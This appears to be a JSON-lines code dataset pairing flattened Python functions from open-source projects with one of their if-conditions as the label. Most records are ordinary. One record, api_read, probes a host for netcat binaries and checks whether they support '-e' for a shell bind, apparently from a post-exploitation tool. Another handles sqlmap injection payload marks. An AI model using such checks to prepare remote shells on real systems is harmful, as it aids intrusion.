{"input": "def __init__(self, items): self._format = string.join(map(lambda item: item[0], items), \"\") self._items = items self._buffer_ = win32wnet.NCBBuffer(struct.calcsize(self._format)) for format, name in self._items: if len(format) == 1: if format == \"c\": val = \"\\0\" else: val = 0 else: l = int(format[:-1]) val = \"\\0\" * l self.__dict__[name] = val", "label": "if len ( format ) == 1 :"}
{"input": "def __init__(self, learners, names=None): self.learners = learners for i, learner in enumerate(learners): self.update_set_reward(learner) learner.accumulated_rewards = [] learner.known_states = [] learner.temperatures = [] if names is None: learner.name = \"Learner %d\" % i else: learner.name = names[i]", "label": "if names is None :"}
{"input": "def __init__(self, *args, **kwargs): self.default_currency = kwargs.pop(\"default_currency\", None) super().__init__(*args, **kwargs) # Rest Framework converts `min_value` / `max_value` to validators, that are not aware about `Money` class # We need to adjust them for idx, validator in enumerate(self.validators): if isinstance(validator, MinValueValidator): self.validators[idx] = MinMoneyValidator(self.min_value) elif isinstance(validator, MaxValueValidator): self.validators[idx] = MaxMoneyValidator(self.max_value)", "label": "if isinstance ( validator , MinValueValidator ) :"}
{"input": "def add_line_taxes(self, lines): for line in lines: if not line.source_line: continue # Cannot have taxes, since not in source for (index, line_tax) in enumerate(line.source_line.taxes, 1): line.taxes.create( tax=line_tax.tax, name=line_tax.name, amount_value=line_tax.amount.value, base_amount_value=line_tax.base_amount.value, ordering=index, )", "label": "if not line . source_line :"}
{"input": "def linesub(match): line = match.group() for token in TOKEN_RE.findall(line): if token in names: targets = names[token] fdist.inc(token) if len(targets) > 1: log.warning( \"%s is ambiguous: %s\" % (token, \", \".join(str(v.canonical_name) for v in names[token])) ) line += INDEXTERM % token # line += INDEXTERM % names[token][0].canonical_name return line", "label": "if len ( targets ) > 1 :"}
{"input": "def ask(self) -> Dict[str, Any]: params = {} param_values = self._optimizer.ask() for (name, distribution), value in zip( sorted(self._search_space.items()), param_values ): if isinstance(distribution, distributions.DiscreteUniformDistribution): value = value * distribution.q + distribution.low if isinstance(distribution, distributions.IntUniformDistribution): value = value * distribution.step + distribution.low if isinstance(distribution, distributions.IntLogUniformDistribution): value = int(np.round(value)) value = min(max(value, distribution.low), distribution.high) params[name] = value return params", "label": "if isinstance ( distribution , distributions . IntUniformDistribution ) :"}
{"input": "def fetcher(): while True: try: if not self._running: break self.fetch() self._cluster.handler.sleep(0.01) except ReferenceError: break except Exception: # surface all exceptions to the main thread self._worker_exception = sys.exc_info() break try: self.cleanup() except ReferenceError as e: log.debug(\"Attempt to cleanup consumer failed with ReferenceError\") log.debug(\"Fetcher thread exiting\")", "label": "if not self . _running :"}
{"input": "def write_text(self, text): \"\"\"Writes re-indented text into the buffer.\"\"\" should_indent = False rows = [] for row in text.split(\"\\n\"): if should_indent: row = \" {}\".format(row) if \"\\b\" in row: row = row.replace(\"\\b\", \"\", 1) should_indent = True elif not len(row.strip()): should_indent = False rows.append(row) self.write(\"{}\\n\".format(\"\\n\".join(rows)))", "label": "if \"\\b\" in row :"}
{"input": "def test_kafka_consumer(self): self.send_messages(0, range(0, 100)) self.send_messages(1, range(100, 200)) # Start a consumer consumer = self.kafka_consumer(auto_offset_reset=\"earliest\") n = 0 messages = {0: set(), 1: set()} for m in consumer: logging.debug(\"Consumed message %s\" % repr(m)) n += 1 messages[m.partition].add(m.offset) if n >= 200: break self.assertEqual(len(messages[0]), 100) self.assertEqual(len(messages[1]), 100)", "label": "if n >= 200 :"}
{"input": "def get_command(scaffolding, command_path): path, _, command_name = command_path.rpartition(\".\") if path not in scaffolding: raise KeyError('Ingredient for command \"%s\" not found.' % command_path) if command_name in scaffolding[path].commands: return scaffolding[path].commands[command_name] else: if path: raise KeyError( 'Command \"%s\" not found in ingredient \"%s\"' % (command_name, path) ) else: raise KeyError('Command \"%s\" not found' % command_name)", "label": "if path :"}
{"input": "def build_extension(self, ext): ext._convert_pyx_sources_to_lang() _compiler = self.compiler try: if isinstance(ext, Library): self.compiler = self.shlib_compiler _build_ext.build_extension(self, ext) if ext._needs_stub: cmd = self.get_finalized_command(\"build_py\").build_lib self.write_stub(cmd, ext) finally: self.compiler = _compiler", "label": "if isinstance ( ext , Library ) :"}
{"input": "def _send_payload(self, payload): req = eventlet_urllib2.Request(self._url, headers=payload[1]) try: if sys.version_info < (2, 6): response = eventlet_urllib2.urlopen(req, payload[0]).read() else: response = eventlet_urllib2.urlopen(req, payload[0], self.timeout).read() return response except Exception as err: return err", "label": "if sys . version_info < ( 2 , 6 ) :"}
{"input": "def get_access_token(self, callback): if not self.is_authorized(): callback(None) else: access_token = config.persist[\"oauth_access_token\"] access_token_expires = config.persist[\"oauth_access_token_expires\"] if access_token and time.time() < access_token_expires: callback(access_token) else: self.forget_access_token() self.refresh_access_token(callback)", "label": "if access_token and time . time ( ) < access_token_expires :"}
{"input": "def mark_first_parents(event): \"\"\"Mark the node and all its parents.\"\"\" c = event.get(\"c\") if not c: return changed = [] for parent in c.p.self_and_parents(): if not parent.isMarked(): parent.v.setMarked() parent.setAllAncestorAtFileNodesDirty() changed.append(parent.copy()) if changed: # g.es(\"marked: \" + ', '.join([z.h for z in changed])) c.setChanged() c.redraw() return changed", "label": "if not parent . isMarked ( ) :"}
{"input": "def normalize_reg_path(self, path): new = path if path: roots = (\"\\\\registry\\\\machine\\\\\", \"hklm\\\\\") for r in roots: if path.lower().startswith(r): new = \"HKEY_LOCAL_MACHINE\\\\\" + path[len(r) :] return new return path", "label": "if path . lower ( ) . startswith ( r ) :"}
{"input": "def extract_labels(filename, one_hot=False): \"\"\"Extract the labels into a 1D uint8 numpy array [index].\"\"\" print(\"Extracting\", filename) with gzip.open(filename) as bytestream: magic = _read32(bytestream) if magic != 2049: raise ValueError( \"Invalid magic number %d in MNIST label file: %s\" % (magic, filename) ) num_items = _read32(bytestream) buf = bytestream.read(num_items) labels = numpy.frombuffer(buf, dtype=numpy.uint8) if one_hot: return dense_to_one_hot(labels) return labels", "label": "if one_hot :"}
{"input": "def on_change(self, data): # loop over tp_clipboard views for window in sublime.windows(): for view in window.views(): if view.get_status(\"inactive\") and view.settings().get(\"tp_append\", False): file_name = view.file_name() # ammo if view.settings().get(\"tp_ammo\", False): self.update(view) elif file_name and file_name.endswith( global_settings(\"ammo_file_extension\", \".ammo\") ): self.update(view)", "label": "if view . settings ( ) . get ( \"tp_ammo\" , False ) :"}
{"input": "def list(self, items, columns=4, width=80): items = list(sorted(items)) colw = width // columns rows = (len(items) + columns - 1) // columns for row in range(rows): for col in range(columns): i = col * rows + row if i < len(items): self.output.write(items[i]) if col < columns - 1: self.output.write(\" \" + \" \" * (colw - 1 - len(items[i]))) self.output.write(\"\\n\")", "label": "if i < len ( items ) :"}
{"input": "def test_dynamic_section_solaris(self): \"\"\"Verify that we can parse relocations from the .dynamic section\"\"\" test_dir = os.path.join(\"test\", \"testfiles_for_unittests\") with open(os.path.join(test_dir, \"exe_solaris32_cc.elf\"), \"rb\") as f: elff = ELFFile(f) for sect in elff.iter_sections(): if isinstance(sect, DynamicSection): relos = sect.get_relocation_tables() self.assertEqual(set(relos), {\"JMPREL\", \"REL\"})", "label": "if isinstance ( sect , DynamicSection ) :"}
{"input": "def close(self, checkcount=False): self.mutex.acquire() try: if checkcount: self.openers -= 1 if self.openers == 0: self.do_close() else: if self.openers > 0: self.do_close() self.openers = 0 finally: self.mutex.release()", "label": "if self . openers > 0 :"}
{"input": "def subcommand_table(self): if self._subcommand_table is None: if self._topic_tag_db is None: self._topic_tag_db = TopicTagDB() self._topic_tag_db.load_json_index() self._subcommand_table = self._create_subcommand_table() return self._subcommand_table", "label": "if self . _topic_tag_db is None :"}
{"input": "def layer_init(self): for layer in self.cnn: # type: ignore if isinstance(layer, (nn.Conv2d, nn.Linear)): nn.init.kaiming_normal_(layer.weight, nn.init.calculate_gain(\"relu\")) if layer.bias is not None: nn.init.constant_(layer.bias, val=0)", "label": "if layer . bias is not None :"}
{"input": "def _append_modifier(code, modifier): if modifier == \"euro\": if \".\" not in code: return code + \".ISO8859-15\" _, _, encoding = code.partition(\".\") if encoding in (\"ISO8859-15\", \"UTF-8\"): return code if encoding == \"ISO8859-1\": return _replace_encoding(code, \"ISO8859-15\") return code + \"@\" + modifier", "label": "if encoding == \"ISO8859-1\" :"}
{"input": "def set_mean(self, mean): if mean is not None: # mean value, may be one value per channel if mean.ndim == 1: mean = mean[:, np.newaxis, np.newaxis] else: # elementwise mean if self.is_color: assert len(mean.shape) == 3 self.mean = mean", "label": "if mean . ndim == 1 :"}
{"input": "def _set_state(self, value): if self._pwm: try: value = int(value * self._connection.get_PWM_range(self._number)) if value != self._connection.get_PWM_dutycycle(self._number): self._connection.set_PWM_dutycycle(self._number, value) except pigpio.error: raise PinInvalidState('invalid state \"%s\" for pin %r' % (value, self)) elif self.function == \"input\": raise PinSetInput(\"cannot set state of pin %r\" % self) else: # write forces pin to OUTPUT, hence the check above self._connection.write(self._number, bool(value))", "label": "if value != self . _connection . get_PWM_dutycycle ( self . _number ) :"}
{"input": "def do_stop(self): logger.info(\"[%s] Stopping all workers\", self.name) for w in self.workers.values(): try: w.terminate() w.join(timeout=1) # A already dead worker or in a worker except (AttributeError, AssertionError): pass # Close the server socket if it was opened if self.http_daemon: if self.brok_interface: self.http_daemon.unregister(self.brok_interface) if self.scheduler_interface: self.http_daemon.unregister(self.scheduler_interface) # And then call our master stop from satellite code super(Satellite, self).do_stop()", "label": "if self . scheduler_interface :"}
{"input": "def iter_input(input, filename, parser, line_by_line): if isinstance(input, basestring): with open(input, \"rb\") as f: for tree in iter_input(f, filename, parser, line_by_line): yield tree else: try: if line_by_line: for line in input: if line: yield et.ElementTree(et.fromstring(line, parser)) else: yield et.parse(input, parser) except IOError: e = sys.exc_info()[1] error(\"parsing %r failed: %s: %s\", filename, e.__class__.__name__, e)", "label": "if line_by_line :"}
{"input": "def debug_print(data: json): try: print(\"[+] ---Debug info---\") for i, v in data.items(): if i == \"outline\": print(\"[+] -\", i, \" :\", len(v), \"characters\") continue if i == \"actor_photo\" or i == \"year\": continue print(\"[+] -\", \"%-11s\" % i, \":\", v) print(\"[+] ---Debug info---\") except: pass", "label": "if i == \"actor_photo\" or i == \"year\" :"}
{"input": "def deliver_event(self): while True: client = self._client() if client is None: return # weakref is dead, nothing to deliver diff = self._due - client.loop.time() if diff <= 0: # We've hit our due time, deliver event. It won't respect # sequential updates but fixing that would just worsen this. await client._dispatch_event(self._event) return del client # Clear ref and sleep until our due time await asyncio.sleep(diff)", "label": "if client is None :"}
{"input": "def pluginload(bot, event, *args): \"\"\"loads a previously unloaded plugin, requires plugins. prefix\"\"\" if args: module_path = args[0] try: if plugins.load(bot, module_path): message = \"<b><pre>{}</pre>: loaded</b>\".format(module_path) else: message = \"<b><pre>{}</pre>: failed</b>\".format(module_path) except RuntimeError as e: message = \"<b><pre>{}</pre>: <pre>{}</pre></b>\".format(module_path, str(e)) else: message = \"<b>module path required</b>\" yield from bot.coro_send_message(event.conv_id, message)", "label": "if plugins . load ( bot , module_path ) :"}
{"input": "def validate_prompt_lb(hostname): # Run the standard hostname check first: hostname = validate_prompt_hostname(hostname) # Make sure this host wasn't already specified: for host in hosts: if host.connect_to == hostname and (host.is_master() or host.is_node()): raise click.BadParameter( 'Cannot re-use \"%s\" as a load balancer, ' \"please specify a separate host\" % hostname ) return hostname", "label": "if host . connect_to == hostname and ( host . is_master ( ) or host . is_node ( ) ) :"}
{"input": "def alter_inventory(session, resource, amount): \"\"\"Alters the inventory of each settlement.\"\"\" # NOTE avoid circular import from horizons.component.storagecomponent import StorageComponent for settlement in session.world.settlements: if settlement.owner == session.world.player and settlement.warehouse: settlement.warehouse.get_component(StorageComponent).inventory.alter( resource, amount )", "label": "if settlement . owner == session . world . player and settlement . warehouse :"}
{"input": "def _(value): if kb.customInjectionMark in (value or \"\"): if payload is None: value = value.replace(kb.customInjectionMark, \"\") else: value = re.sub(r\"\\w*%s\" % re.escape(kb.customInjectionMark), payload, value) return value", "label": "if payload is None :"}
{"input": "def __call__(self, target): if \"weights\" not in target.temp: return True targets = target.temp[\"weights\"] for cname in target.children: if cname in targets: c = target.children[cname] deviation = abs((c.weight - targets[cname]) / targets[cname]) if deviation > self.tolerance: return True if \"cash\" in target.temp: cash_deviation = abs( (target.capital - targets.value) / targets.value - target.temp[\"cash\"] ) if cash_deviation > self.tolerance: return True return False", "label": "if cash_deviation > self . tolerance :"}
{"input": "def splitroot(self, part, sep=sep): if part and part[0] == sep: stripped_part = part.lstrip(sep) # According to POSIX path resolution: # http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap04.html#tag_04_11 # \"A pathname that begins with two successive slashes may be # interpreted in an implementation-defined manner, although more # than two leading slashes shall be treated as a single slash\". if len(part) - len(stripped_part) == 2: return \"\", sep * 2, stripped_part else: return \"\", sep, stripped_part else: return \"\", \"\", part", "label": "if len ( part ) - len ( stripped_part ) == 2 :"}
{"input": "def _Determine_Do(self): self.applicable = 1 method = \"moz-src\" method_arg = None for opt, optarg in self.chosenOptions: if opt == \"--moz-src\": method = \"moz-src\" elif opt == \"--moz-objdir\": method = \"moz-objdir\" method_arg = optarg if method == \"moz-src\": self.value = self._get_mozilla_objdir() elif method == \"moz-objdir\": self.value = self._use_mozilla_objdir(method_arg) else: raise black.configure.ConfigureError(\"bogus method: %r\" % method) self.determined = 1", "label": "if opt == \"--moz-src\" :"}
{"input": "def is_filtered_inherited_member(name: str, obj: Any) -> bool: if inspect.isclass(self.object): for cls in self.object.__mro__: if cls.__name__ == self.options.inherited_members and cls != self.object: # given member is a member of specified *super class* return True elif name in cls.__dict__: return False elif name in self.get_attr(cls, \"__annotations__\", {}): return False elif isinstance(obj, ObjectMember) and obj.class_ is cls: return False return False", "label": "elif name in self . get_attr ( cls , \"__annotations__\" , { } ) :"}
{"input": "def _remove_all_greasemonkey_scripts(self): page_scripts = self._widget.page().scripts() for script in page_scripts.toList(): if script.name().startswith(\"GM-\"): log.greasemonkey.debug(\"Removing script: {}\".format(script.name())) removed = page_scripts.remove(script) assert removed, script.name()", "label": "if script . name ( ) . startswith ( \"GM-\" ) :"}
{"input": "def merge_intervals(intervals): \"\"\"Merge intervals in the form of a list.\"\"\" if intervals is None: return None intervals.sort(key=lambda i: i[0]) out = [intervals.pop(0)] for i in intervals: if out[-1][-1] >= i[0]: out[-1][-1] = max(out[-1][-1], i[-1]) else: out.append(i) return out", "label": "if out [ - 1 ] [ - 1 ] >= i [ 0 ] :"}
{"input": "def __setattr__(self, key, val): self.__dict__[key] = val self.__dict__[key.upper()] = val levels = key.split(\".\") last_level = len(levels) - 1 pointer = self._pointer if len(levels) > 1: for i, l in enumerate(levels): if hasattr(self, l) and isinstance(getattr(self, l), Config): setattr(getattr(self, l), \".\".join(levels[i:]), val) if l == last_level: pointer[l] = val else: pointer = pointer[l]", "label": "if hasattr ( self , l ) and isinstance ( getattr ( self , l ) , Config ) :"}
{"input": "def get_menu_title(self): handle = self.obj.get_handle() if handle: who = get_participant_from_event(self.db, handle) desc = self.obj.get_description() event_name = self.obj.get_type() if desc: event_name = \"%s - %s\" % (event_name, desc) if who: event_name = \"%s - %s\" % (event_name, who) dialog_title = _(\"Event: %s\") % event_name else: dialog_title = _(\"New Event\") return dialog_title", "label": "if desc :"}
{"input": "def perform_initialization(m): if isinstance(m, self.initialize_layers): if initialization_method is not None: initialization_method(m.weight.data, **initialization_kwargs) if ( m.bias is not None and self.initialize_bias != \"No\" and initialization_method_bias is not None ): try: initialization_method_bias(m.bias.data, **initialization_kwargs_bias) except ValueError: pass", "label": "if initialization_method is not None :"}
{"input": "def forward(self, inputs): x = inputs[\"image\"] out = self.conv0(x) out = self.downsample0(out) blocks = [] for i, conv_block_i in enumerate(self.darknet_conv_block_list): out = conv_block_i(out) if i == self.freeze_at: out.stop_gradient = True if i in self.return_idx: blocks.append(out) if i < self.num_stages - 1: out = self.downsample_list[i](out) return blocks", "label": "if i in self . return_idx :"}
{"input": "def _urlvars__set(self, value): environ = self.environ if \"wsgiorg.routing_args\" in environ: environ[\"wsgiorg.routing_args\"] = (environ[\"wsgiorg.routing_args\"][0], value) if \"paste.urlvars\" in environ: del environ[\"paste.urlvars\"] elif \"paste.urlvars\" in environ: environ[\"paste.urlvars\"] = value else: environ[\"wsgiorg.routing_args\"] = ((), value)", "label": "if \"paste.urlvars\" in environ :"}
{"input": "def forward(self, x, activate=True, norm=True): for layer in self.order: if layer == \"conv\": if self.with_explicit_padding: x = self.padding_layer(x) x = self.conv(x) elif layer == \"norm\" and norm and self.with_norm: x = self.norm(x) elif layer == \"act\" and activate and self.with_activation: x = self.activate(x) return x", "label": "elif layer == \"act\" and activate and self . with_activation :"}
{"input": "def add(self, entry): if not self._find_entry(entry, filters=False): show = self.add_show(entry) if show: self._shows = None log.verbose(\"Successfully added show %s to Sonarr\", show[\"title\"]) else: log.debug(\"entry %s already exists in Sonarr list\", entry)", "label": "if show :"}
{"input": "def __eq__(self, other): if not isinstance(other, Result): return False equal = self.info == other.info equal &= self.stats == other.stats equal &= self.trajectories == other.trajectories for k in self.np_arrays: if k not in other.np_arrays: equal &= False break if not equal: break equal &= all([np.array_equal(self.np_arrays[k], other.np_arrays[k])]) return equal", "label": "if not equal :"}
{"input": "def handle_server_api(output, kwargs): \"\"\"Special handler for API-call 'set_config' [servers]\"\"\" name = kwargs.get(\"keyword\") if not name: name = kwargs.get(\"name\") if name: server = config.get_config(\"servers\", name) if server: server.set_dict(kwargs) old_name = name else: config.ConfigServer(name, kwargs) old_name = None sabnzbd.Downloader.update_server(old_name, name) return name", "label": "if server :"}
{"input": "def extractNames(self, names): offset = names[\"offset\"].value for header in names.array(\"header\"): key = header[\"nameID\"].value foffset = offset + header[\"offset\"].value field = names.getFieldByAddress(foffset * 8) if not field or not isString(field): continue value = field.value if key not in self.NAMEID_TO_ATTR: continue key = self.NAMEID_TO_ATTR[key] if key == \"version\" and value.startswith(u\"Version \"): # \"Version 1.2\" => \"1.2\" value = value[8:] setattr(self, key, value)", "label": "if not field or not isString ( field ) :"}
{"input": "def api_read(self): files = [] files.append(\"/bin/netcat\") files.append(\"/etc/alternative/netcat\") files.append(\"/bin/nc\") # init variables installed = False support = False path = None for _file in files: file_content = self.shell.read(_file) if file_content: installed = True path = _file if \"-e filename\" in file_content: support = True break result = { \"netcat_installed\": installed, \"supports_shell_bind\": support, \"path\": path, } return result", "label": "if \"-e filename\" in file_content :"}
{"input": "def _get_iscsi_portal(self, netspace): for netpsace_interface in netspace.get_ips(): if netpsace_interface.enabled: port = netspace.get_properties().iscsi_tcp_port return \"%s:%s\" % (netpsace_interface.ip_address, port) # if we get here it means there are no enabled ports msg = _(\"No available interfaces in iSCSI network space %s\") % netspace.get_name() raise exception.VolumeDriverException(message=msg)", "label": "if netpsace_interface . enabled :"}
{"input": "def show(self): if len(self.figures.keys()) == 0: return if not SETTINGS.plot_split: if SETTINGS.plot_backend.lower() == \"qt4agg\": self.tabbed_qt4_window() elif SETTINGS.plot_backend.lower() == \"qt5agg\": self.tabbed_qt5_window() elif SETTINGS.plot_backend.lower() == \"tkagg\": self.tabbed_tk_window() else: plt.show() else: plt.show()", "label": "elif SETTINGS . plot_backend . lower ( ) == \"tkagg\" :"}
{"input": "def _update_decommissioned_icon(self): \"\"\"Add or remove decommissioned icon.\"\"\" if not self.instance.has_status_icon: return if self.is_active() is not self.__active: self.__active = not self.__active if self.__active: RemoveStatusIcon.broadcast(self, self.instance, DecommissionedStatus) else: self._add_status_icon(DecommissionedStatus(self.instance))", "label": "if self . __active :"}
{"input": "def _count(self, element, count=True): if not isinstance(element, six.string_types): if self == element: return 1 i = 0 for child in self.children: # child is text content and element is also text content, then # make a simple \"text\" in \"text\" if isinstance(child, six.string_types): if isinstance(element, six.string_types): if count: i += child.count(element) elif element in child: return 1 else: i += child._count(element, count=count) if not count and i: return i return i", "label": "if isinstance ( child , six . string_types ) :"}
{"input": "def test_read_lazy(self): want = b\"x\" * 100 telnet = test_telnet([want]) self.assertEqual(b\"\", telnet.read_lazy()) data = b\"\" while True: try: read_data = telnet.read_lazy() data += read_data if not read_data: telnet.fill_rawq() except EOFError: break self.assertTrue(want.startswith(data)) self.assertEqual(data, want)", "label": "if not read_data :"}
{"input": "def getprefs(path=PREFSFILENAME): if not os.path.exists(path): f = open(path, \"w\") f.write(default_prefs) f.close() f = open(path) lines = f.readlines() prefs = {} for line in lines: if line[-1:] == \"\\n\": line = line[:-1] try: name, value = re.split(\":\", line, 1) prefs[string.strip(name)] = eval(value) except: pass return prefs", "label": "if line [ - 1 : ] == \"\\n\" :"}
{"input": "def connect(self): while True: errno = self.sock.connect_ex(self.addr) if not errno: # connected immediately. break elif errno == EINPROGRESS: # will be connected. break elif errno == ENOENT: # no such socket file. self.create_connection(self.failover_interval) return else: raise ValueError(\"Unexpected socket errno: %d\" % errno) self.event_loop.watch_file(self.sock.fileno(), self.handle)", "label": "if not errno :"}
{"input": "def set_enabled_addons(file_path, addons, comment=None): with codecs.open(file_path, \"w\", \"utf-8\") as f: if comment: f.write(\"# %s\\n\\n\" % comment) for addon in addons: f.write(\"%s\\n\" % addon)", "label": "if comment :"}
{"input": "def check_interfaceinNetWorkManager(self, interface): \"\"\"check if interface is already in file config\"\"\" mac = Refactor.get_interface_mac(interface) if mac != None: if mac in open(self.mn_path, \"r\").read(): return True if interface in open(self.mn_path, \"r\").read(): return True return False", "label": "if interface in open ( self . mn_path , \"r\" ) . read ( ) :"}
{"input": "def spaceless(writer, node): original = writer.spaceless writer.spaceless = True writer.warn(\"entering spaceless mode with different semantics\", node) # do the initial stripping nodelist = list(node.nodelist) if nodelist: if isinstance(nodelist[0], TextNode): nodelist[0] = TextNode(nodelist[0].s.lstrip()) if isinstance(nodelist[-1], TextNode): nodelist[-1] = TextNode(nodelist[-1].s.rstrip()) writer.body(nodelist) writer.spaceless = original", "label": "if isinstance ( nodelist [ 0 ] , TextNode ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_app_id(d.getPrefixedString()) continue if tt == 18: self.set_queue_name(d.getPrefixedString()) continue if tt == 24: self.set_pause(d.getBoolean()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 18 :"}
{"input": "def group_re(self): \"\"\"Return a regexp pattern with named groups\"\"\" out = \"\" for token, data in self.tokens(): if token == \"TXT\": out += re.escape(data) elif token == \"VAR\": out += \"(?P<%s>%s)\" % (data[1], data[0]) elif token == \"ANON\": out += \"(?:%s)\" % data return out", "label": "elif token == \"VAR\" :"}
{"input": "def wrap_in(input): if isinstance(input, (SymbolicInput)): return input elif isinstance(input, gof.Variable): # r -> SymbolicInput(variable=r) return SymbolicInput(input) elif isinstance(input, (list, tuple)): # (r, u) -> SymbolicInput(variable=r, update=u) if len(input) == 2: return SymbolicInput(input[0], update=input[1]) else: raise TypeError(\"Expected two elements in the list or tuple.\", input) else: raise TypeError( \"Unknown input type: %s (%s), expected Variable \" \"instance\", type(input), input, )", "label": "if len ( input ) == 2 :"}
{"input": "def _remove_event(self, event): # Find event according to its timestamp. # Index returned should be one behind. i = bisect.bisect(self._eventq, event) # Having two events with identical timestamp is unlikely but possible. # I am going to move forward and compare timestamp AND object address # to make sure the correct object is found. while i > 0: i -= 1 e = self._eventq[i] if e.timestamp != event.timestamp: raise exception.EventNotFound(event) elif id(e) == id(event): self._eventq.pop(i) return raise exception.EventNotFound(event)", "label": "if e . timestamp != event . timestamp :"}
{"input": "def cron_starter(*args: Any) -> None: _tz = self.conf.timezone if timezone is None else timezone while not self.should_stop: await self.sleep(cron.secs_for_next(cron_format, _tz)) if not self.should_stop: should_run = not on_leader or self.is_leader() if should_run: with self.trace(shortlabel(fun), trace_enabled=traced): await fun(*args)", "label": "if should_run :"}
{"input": "def _find_boundary(self): ct_info = tuple(x.strip() for x in self.content_type.split(\";\")) mimetype = ct_info[0] if mimetype.split(\"/\")[0].lower() != \"multipart\": raise NonMultipartContentTypeException( \"Unexpected mimetype in content-type: '{0}'\".format(mimetype) ) for item in ct_info[1:]: attr, value = _split_on_find(item, \"=\") if attr.lower() == \"boundary\": self.boundary = encode_with(value.strip('\"'), self.encoding)", "label": "if attr . lower ( ) == \"boundary\" :"}
{"input": "def get_kwarg_or_param(request, kwargs, key): value = None try: value = kwargs[key] except KeyError: if request.method == \"GET\": value = request.GET.get(key) elif request.method == \"POST\": value = request.POST.get(key) return value", "label": "elif request . method == \"POST\" :"}
{"input": "def _gather_async_results(self, result: Result, source: typing.Any) -> None: try: context = result[\"context\"] context[\"is_refresh\"] = False context[\"vars\"] = self._vim.vars async_candidates = source.gather_candidates(context) context[\"vars\"] = None result[\"is_async\"] = context[\"is_async\"] if async_candidates is None: return context[\"candidates\"] += convert2candidates(async_candidates) except Exception as exc: self._handle_source_exception(source, exc)", "label": "if async_candidates is None :"}
{"input": "def _check_session(self, session, action): if session is None: if isinstance(self, tuple): key = self[0].key else: key = self.key raise ValueError( f\"Tileable object {key} must be executed first before {action}\" )", "label": "if isinstance ( self , tuple ) :"}
{"input": "def update(self, dict=None, **kwargs): if self._pending_removals: self._commit_removals() d = self.data if dict is not None: if not hasattr(dict, \"items\"): dict = type({})(dict) for key, o in dict.items(): d[key] = KeyedRef(o, self._remove, key) if len(kwargs): self.update(kwargs)", "label": "if not hasattr ( dict , \"items\" ) :"}
{"input": "def get_sigma(self): if self.wants_automatic_sigma.value: # # Constants here taken from FindEdges.m # if self.method == M_CANNY: return 1.0 elif self.method == M_LOG: return 2.0 else: raise NotImplementedError( \"Automatic sigma not supported for method %s.\" % self.method.value ) else: return self.sigma.value", "label": "elif self . method == M_LOG :"}
{"input": "def forward(self, x, activate=True, norm=True): for layer in self.order: if layer == \"conv\": if self.with_explicit_padding: x = self.padding_layer(x) x = self.conv(x) elif layer == \"norm\" and norm and self.with_norm: x = self.norm(x) elif layer == \"act\" and activate and self.with_activation: x = self.activate(x) return x", "label": "if layer == \"conv\" :"}
{"input": "def _grouping_intervals(grouping): last_interval = None for interval in grouping: # if grouping is -1, we are done if interval == CHAR_MAX: return # 0: re-use last group ad infinitum if interval == 0: if last_interval is None: raise ValueError(\"invalid grouping\") while True: yield last_interval yield interval last_interval = interval", "label": "if interval == CHAR_MAX :"}
{"input": "def iterRelativeExportCFiles(basepath): for root, dirs, files in os.walk(basepath, topdown=True): for directory in dirs: if isAddonDirectoryIgnored(directory): dirs.remove(directory) for filename in files: if not isExportCFileIgnored(filename): fullpath = os.path.join(root, filename) yield os.path.relpath(fullpath, basepath)", "label": "if isAddonDirectoryIgnored ( directory ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.add_application_key(d.getPrefixedString()) continue if tt == 18: self.set_tag(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.set_format(d.getVarInt32()) continue if tt == 18: self.set_path(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 18 :"}
{"input": "def _get_future_trading_minutes(self, trading_date): trading_minutes = set() universe = self._get_universe() for order_book_id in universe: if self._env.get_account_type(order_book_id) == DEFAULT_ACCOUNT_TYPE.STOCK: continue trading_minutes.update( self._env.data_proxy.get_trading_minutes_for(order_book_id, trading_date) ) return set([convert_int_to_datetime(minute) for minute in trading_minutes])", "label": "if self . _env . get_account_type ( order_book_id ) == DEFAULT_ACCOUNT_TYPE . STOCK :"}
{"input": "def helper(chunk: Any) -> Any: nonlocal counter if not isinstance(chunk, dict): return chunk if len(chunk) <= 2: return chunk id = hash(str(chunk)) if id in cache: return cache[id] else: cache[id] = {\".id\": counter} chunk[\".cache_id\"] = counter counter += 1 for name in sorted(chunk.keys()): value = chunk[name] if isinstance(value, list): chunk[name] = [helper(child) for child in value] elif isinstance(value, dict): chunk[name] = helper(value) return chunk", "label": "if isinstance ( value , list ) :"}
{"input": "def _render_lang_List(self, element): with self.buffer.foldable_lines(): self.buffer.write(\"[\", style=self.styles.bracket) item_count = len(element.items) if item_count: with self.buffer.indent(): for idx, item in enumerate(element.items): self._render(item) if idx < (item_count - 1): self.buffer.write(\",\") self.buffer.mark_line_break() if element.trimmed: self.buffer.write(\"...\") self.buffer.write(\"]\", style=self.styles.bracket)", "label": "if element . trimmed :"}
{"input": "def test_parse_query_params_matchable_field(self): query_params = { \"filter[string_field][contains]\": \"foo\", \"filter[string_field][icontains]\": \"bar\", } fields = self.view.parse_query_params(query_params) for key, field_name in fields.items(): if field_name[\"string_field\"][\"op\"] == \"contains\": assert_equal(field_name[\"string_field\"][\"value\"], \"foo\") elif field_name[\"string_field\"][\"op\"] == \"icontains\": assert_equal(field_name[\"string_field\"][\"value\"], \"bar\") else: self.fail()", "label": "elif field_name [ \"string_field\" ] [ \"op\" ] == \"icontains\" :"}
{"input": "def on_www_authenticate(data=None): io_loop.remove_timeout(timeout[0]) if data: scheme = re.findall(\"WWW-Authenticate: ([^\\s]+)\", data)[0].strip() logging.debug(\"rtsp netcam auth scheme: %s\" % scheme) if scheme.lower() == \"basic\": send_auth[0] = True connect() else: logging.debug( \"rtsp auth scheme digest not supported, considering credentials ok\" ) handle_success(\"(unknown) \") else: logging.error(\"timeout waiting for rtsp auth scheme\") handle_error(\"timeout waiting for rtsp netcam response\")", "label": "if scheme . lower ( ) == \"basic\" :"}
